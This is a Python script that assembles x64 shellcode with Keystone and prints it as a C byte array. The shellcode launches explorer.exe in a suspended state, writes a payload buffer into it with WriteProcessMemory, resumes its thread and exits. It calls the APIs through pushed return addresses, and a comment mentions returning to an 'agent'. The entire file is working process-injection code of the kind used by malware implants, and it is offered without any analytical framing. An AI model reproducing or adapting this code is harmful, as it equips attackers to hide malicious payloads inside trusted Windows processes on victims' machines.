from keystone import *
import ctypes, struct

CODE = (
    " start: "
        # CreateProcessA (C:\Windows\explorer.exe) proxy2
        " add rsp, 0x08;"
        " movq rax, 0x6578652e726572;"
        " push rax;"
        " movq rax, 0x6f6c7078655c7377;"
        " push rax;"
        " movq rax, 0x6f646e69775c3a63;"
        " push rax;"
        " mov rbx, rsp;"
        " mov rdx, 0x14h;" 
        " xor rcx, rcx;"
        " loop:"
        "   push rcx;"
        "   dec rdx;"
        "   cmp rdx, rcx;"
        "   jnz loop;"
        " push rcx;"
        " mov rax,rsp;"
        " push rax;"
        " add rax, 0x20;"
        " push rax;"
        " push rcx; "
        " push rcx;"
        " push 0x00000004;"
        " push rcx;"
        " push rcx;"
        " push rcx;"
        " push rcx;"
        " push rbx;"
        " mov rdx, rbx;"
        " xor r8, r8;"
        " xor r9, r9;"
        " lea rbx, [rip]; " # ROP call function
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx, [rbp+0x18]; "
        " push rbx; "
        " ret; "
        " mov rcx, [rsp-0x18];"
        " xor rax, rax; "
        " mov rax, [rcx];" # rcx = dwProcessId
        " mov qword ptr [rbp+0x90], rax; " # Save hProcess for later usage
        " mov rax, [rcx+0x08]; " # rcx = hThread
        " mov qword ptr [rbp+0x98], rax ;" # Save hThread for later usage# Return to the agent

        # WriteProcessMemory
        " mov rcx, [rbp+0x90];"
        " mov rdx, [rbp+0xF8];"
        " mov r8, [rbp+0xF8];"
        " mov r9, 0x400;"
        " mov r10, rbp;"
        " add r10, 0xF0;"
        " push r10; "
        " push r9; "
        " push r8; "
        " push rdx; "
        " push rcx; "
        " lea rbx, [rip]; " # ROP call function
        " add rbx, 0x0e;"
        " push rbx; "
        " mov rbx, [rbp+0x80]; "
        " push rbx; "
        " ret; "
        # ResumeThread
        " mov rcx, [rbp+0x98];"
        " lea rbx, [rip]; " # ROP call function
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx, [rbp+0x48]; "
        " push rbx; "
        " ret; "
        # ExitProcess
        " xor rcx, rcx; "
        " push rcx; "
        " lea rbx, [rip]; " # ROP call function
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx, [rbp+0x30]; "
        " push rbx; "
        " ret; "

)
ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks.asm(CODE)
instructions = ""
i=1
for dec in encoding: 
    if(i % 20 == 0) and (i<len(encoding)):
        instructions += "\\x{0:02x}".format(int(dec)).rstrip("\r\n")
        instructions += "\"\r\n\""
    else:
        instructions += "\\x{0:02x}".format(int(dec)).rstrip("\r\n") 
    i+=1
print("unsigned char proxy_create_process[] = (\r\n\"" + instructions + "\");\r\n")